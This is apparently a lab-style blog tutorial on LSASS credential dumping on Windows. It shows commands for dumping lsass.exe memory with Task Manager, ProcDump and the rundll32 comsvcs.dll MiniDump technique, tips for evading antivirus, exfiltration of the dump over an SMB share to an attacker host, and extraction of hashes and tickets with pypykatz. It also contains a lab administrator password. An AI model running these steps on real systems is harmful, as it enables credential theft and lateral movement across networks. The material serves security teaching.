# Attacking LSASS 

### What is LSASS ?

**LSASS** stands for **Local Security Authority Subsystem Service**.

Think of LSASS as the digital security guard or gatekeeper of your Windows computer. Its primary job is to enforce security policies on the system. Whenever a user tries to log in, change a password, or access a secure file, LSASS is the mechanism working behind the scenes to verify that they actually have permission to do so.

### What Does LSASS Actually Do?

LSASS handles several vital security responsibilities:

*   **User Authentication:** When you type in your password, PIN, or scan your fingerprint (Windows Hello), LSASS verifies those credentials against a secure database to let you in.
    
*   **Password Changes:** It manages the process when you update your login credentials.
    
*   **Access Tokens:** Once you log in, LSASS generates an "access token." This token acts like a temporary digital ID badge, allowing you to open files and apps without having to re-type your password every single two minutes.
    
*   **Security Auditing:** It helps log security events, such as tracking successful or failed login attempts.
    

### Why is LSASS a Prime Target for Attackers?

To put it simply: **LSASS holds the keys to the kingdom.** Because LSASS is responsible for managing active user sessions, it must store authentication data in its active memory. Historically, Windows actually stored passwords in plain, readable text within LSASS. While modern versions of Windows (Windows 8.1 / Server 2012 R2 and newer) have disabled plain-text storage by default, LSASS still holds highly valuable data, including:

*   **NTLM Hashes:** Cryptographic representations of passwords that can sometimes be cracked or reused.
    
*   **Kerberos Tickets:** Digital passes that allow users to access network resources without re-entering credentials.
    
*   **Residual Cleartext Passwords:** Credentials that can still slip through if legacy protocols (like WDigest) are enabled or poorly configured.
    

#### The "LSASS Dump" Attack

If an attacker manages to compromise a single computer and gain **Local Administrator** or **SYSTEM** privileges, their next step is almost always to target LSASS.

They will use administrative tools to read the memory of `lsass.exe` and dump it into a file (often called a `.dmp` file). By exporting this file and running it through credential-extraction tools like *Mimikatz*, they can harvest the hashes and tickets stored inside.

Once the attacker has these credentials, they don’t just own that one computer—they can use them to log into other machines, escalate their privileges, and move laterally across an entire corporate network.

## 1\. **Attacking LSASS with Task Manager**

### **Steps:**

1.  Open Task Manager (Run as Administrator).
    
2.  Click on the Details tab.
    
3.  Scroll down to find lsass.exe.  
    
    ![image1](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image1.png?raw=true)
    
4.  Right-click on lsass.exe and select Create memory dump file.
    

![image2](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image2.png?raw=true)

Windows will create a .dmp file (usually in the user's AppData\\Local\\Temp directory) containing everything LSASS had in memory at that exact second.Windows will create a .dmp file (usually in the user's AppData\\Local\\Temp directory) containing everything LSASS had in memory at that exact second.

![image3](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image33.png?raw=true)

## 2\. **Attacking LSASS with ProcDump**

Although Task Manager can be used to inspect processes, attackers typically prefer working through a command-line interface (CLI). To create a memory dump from the CLI while reducing the chance of immediate antivirus detection, a common choice is ProcDump.

ProcDump is a legitimate utility from Microsoft Sysinternals that helps administrators diagnose application crashes and performance issues. Since the tool is digitally signed by Microsoft, some basic antivirus products may treat it as trusted software.

ProcDump is not included with Windows by default, so it must be downloaded separately. The lab machine has internet access, and you can obtain the executable from Microsoft's Sysinternals page: [https://learn.microsoft.com/en-us/sysinternals/downloads/procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump).

### **Command:**

```bash
procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
```

*   `-accepteula`: Automatically accepts the Microsoft user agreement (crucial for silent CLI execution).
    
*   `-ma`: Tells ProcDump to write a "Full" memory dump.
    
*   `lsass.exe`: The target process.
    

![image4](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image4.png?raw=true)

*   `C:\lsass.dmp`: The output file location.
    

![image5](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image5.png?raw=true)

## 3\. **Attacking LSASS with Native Binaries**

In some situations, transferring a tool such as ProcDump to a target machine may create unnecessary risk. As an alternative, attackers often rely on LOLBins (Living Off the Land Binaries), which are executables that come preinstalled with Windows.

A well-known technique leverages rundll32.exe to invoke a function within comsvcs.dll, a native Windows DLL. The function, MiniDumpW, is capable of creating a process memory dump in a manner similar to Task Manager.

### Command:

Before running the command, you must identify the Process ID (PID) of LSASS. This can be done with with this command

```bash
tasklist | findstr lsass
``` 
For example, assume the PID returned is 728.

![image6](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image6.png?raw=true)

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 728 C:\lsass.dmp full
```

Note: Executing this command requires the SeDebugPrivilege permission, which is enabled by default for Administrator accounts.

![image7](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image7.png?raw=true)

## 3\. **Extracting Secrets from LSASS with pypykatz**

Once we have obtained the `lsass.dmp` file—whether it was created with Task Manager, ProcDump, or `rundll32`—the next step is to analyze it. Since memory dump files are not human-readable, a specialized parser is required to extract useful information.

Although Mimikatz is the traditional tool used for this purpose on Windows, executing it directly on a compromised host is highly detectable and often results in antivirus alerts. To avoid this, many attackers prefer offline analysis. The dump file is copied from the target system to an attacker-controlled machine, such as a Kali Linux host, where it can be examined safely.

For Linux-based analysis, a common choice is Pypykatz, a Python implementation of Mimikatz.

Steps:

**1\. Transfer the File:** Move `lsass.dmp` from the Windows system to your Kali machine using a method such as a Python web server, SMB share, or SCP.

So, for the file transfer, I'm using an SMB share. Modern Windows versions require authentication to connect, so I'll be passing the Local Administrator username and password to gain access

```bash
 sudo impacket-smbserver -username Administrator -password 'ebz0yxy3txh9BDE*yeh' smb  . -smb2support -debug
```

![image8](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image8.png?raw=true)

Next, execute the following command on the Windows target to transfer the file to our attacker system:

```bash
COPY C:\lsass.dmp \\10.200.63.86\smb\
```

![image9](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image9.png?raw=true)

**2\. Run Pypykatz:** Open a terminal on the Kali system and execute the following command against the dump file:

`pypykatz lsa minidump lsass.dmp`

*   `lsa`: Instructs Pypykatz to extract Local Security Authority (LSA) secrets.
    
*   `minidump`: Indicates that the input is an offline memory dump rather than live system memory.
    
*   `lsass.dmp`: The dump file that was transferred from the target machine.
    

```bash
pypykatz lsa minidump lsass.dmp
```

![image10](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LSASS/image10.png?raw=true)
